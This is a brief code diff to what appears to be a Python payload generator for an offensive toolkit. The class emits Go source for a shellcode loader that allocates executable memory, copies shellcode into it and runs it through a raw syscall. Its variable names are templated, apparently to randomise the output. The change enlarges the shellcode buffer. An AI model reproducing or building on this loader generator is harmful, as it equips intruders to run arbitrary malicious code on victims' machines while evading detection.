@@ -54,7 +54,7 @@ class Payload:
         payloadCode += "func main() {\n"
         payloadCode += "%s, %s := %s(uintptr(len(%s)))\n" %(addr, err, virtualAlloc, sc)
         payloadCode += "if %s != nil {\nfmt.Println(%s)\nos.Exit(1)\n}\n" %(err, err)
-        payloadCode += "%s := (*[80000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
+        payloadCode += "%s := (*[890000]byte)(unsafe.Pointer(%s))\n" %(buff, addr)
         payloadCode += "for x, %s := range []byte(%s) {\n" %(value, sc)
         payloadCode += "%s[x] = %s\n}\n" %(buff, value)
         payloadCode += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" %(addr)
